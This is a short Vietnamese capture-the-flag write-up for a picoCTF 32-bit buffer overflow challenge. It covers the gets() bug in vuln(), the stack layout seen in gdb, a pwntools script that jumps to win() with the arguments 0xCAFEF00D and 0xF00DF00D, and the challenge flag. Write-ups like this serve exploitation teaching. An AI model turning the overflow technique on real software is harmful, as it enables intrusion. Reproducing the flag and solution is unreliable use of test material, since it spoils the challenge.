# tóm tắt

ta có lỗi bof ở hàm vuln()

```c
int vuln()
{
  char s[104]; // [esp+Ch] [ebp-6Ch] BYREF

  gets(s);
  return puts(s);
}
```

vậy ta sẽ ret2win, tuy nhiên để in được flag ta sẽ phải OW giá trị

```c
  if ( a1 == 0xCAFEF00D && a2 == 0xF00DF00D )
    return (char *)printf(s);
```

ta debug để xem địa chỉ a1 a2 ở đâu trong stack

```asm
cmp    DWORD PTR [ebp+0x8], 0xcafef00d
cmp    DWORD PTR [ebp+0xc], 0xf00df00d
```

do đó sau khi nhập vào địa chỉ hàm win ta sẽ + 4 byte a và sau đó ow a1, a2

```
0xffe92fb8│+0x0054: 0x20202020
0xffe92fbc│+0x0058: 0x20202020   ← $ebp
0xffe92fc0│+0x005c: 0x61616161
0xffe92fc4│+0x0060: 0xcafef00d
0xffe92fc8│+0x0064: 0xf00df00d
```

script
```python
from pwn import *

r = process("./vuln")
gdb.attach(r, gdbscript = '''
           b*win+118
           b*win+127
           c
           ''')
# r = remote("saturn.picoctf.net", 59769)
input()
exe = ELF("./vuln")
payload  = b"".ljust(112) + p32(exe.sym['win']) + b"aaaa" + p32(0xcafef00d) + p32(0xf00df00d)
r.recvline()
r.sendline(payload)
r.interactive()

#picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
```